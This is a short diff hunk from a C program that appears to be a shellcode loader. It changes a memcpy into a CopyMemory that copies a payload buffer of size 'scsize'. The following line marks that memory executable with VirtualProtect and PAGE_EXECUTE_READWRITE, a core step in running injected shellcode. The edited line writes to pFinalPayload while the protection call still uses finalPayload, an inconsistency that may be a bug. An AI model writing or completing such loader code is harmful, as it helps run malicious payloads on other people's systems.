@@ -69,7 +69,7 @@ int main() {
       return 1;
     }
 
-    memcpy(finalPayload, tmpPayload, scsize);
+    CopyMemory(pFinalPayload, tmpPayload, scsize);
 
     if(!VirtualProtect(finalPayload, scsize, PAGE_EXECUTE_READWRITE, &dwOldProtect))
     {
